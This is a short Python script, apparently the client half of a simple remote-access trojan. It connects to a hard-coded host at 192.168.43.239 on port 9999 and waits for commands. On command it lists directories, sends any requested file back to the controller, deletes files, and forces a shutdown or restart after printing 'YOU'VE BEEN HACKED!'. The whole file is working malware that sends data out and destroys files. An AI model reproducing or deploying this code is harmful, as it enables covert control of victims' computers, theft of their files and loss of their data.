import socket
import os
import time

client_socket = socket.socket()
port_number = 9999

server_address = "192.168.43.239"
client_socket.connect((server_address, port_number))

print("Connected Successfully!")

while 1:
    command = client_socket.recv(1024)
    command = command.decode()
    print("Command received successfully!")
    
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        client_socket.send(files.encode())
        print("Command view_cwd executed correctly!")
    
    elif command == "custom_dir":
        user_input = client_socket.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        
        client_socket.send(files.encode())
        print("Command custom_dir executed correctly!")

    elif command == "download_files":
        filepath = client_socket.recv(5000)
        filepath = filepath.decode()
        files = open(filepath, "rb")
        data = files.read()
        client_socket.send(data)
        print("Command download_files executed correctly!")
    
    elif command == "remove_files":
        filepath = client_socket.recv(5000)
        filepath = filepath.decode()
        files = os.remove(filepath)
        print("Command remove_files executed correctly!")

    elif command == "shutdown_client":
        print("YOU'VE BEEN HACKED! THIS PC WILL SHUTDOWN AFTER 10 SECONDS!")
        time.sleep(10)
        os.system("shutdown /s /t 1")

    elif command == "restart_client":
        print("YOU'VE BEEN HACKED! THIS PC WILL RESTART AFTER 10 SECONDS!")
        time.sleep(10)
        os.system("shutdown /r /t 1")

    else:
        print("Leave")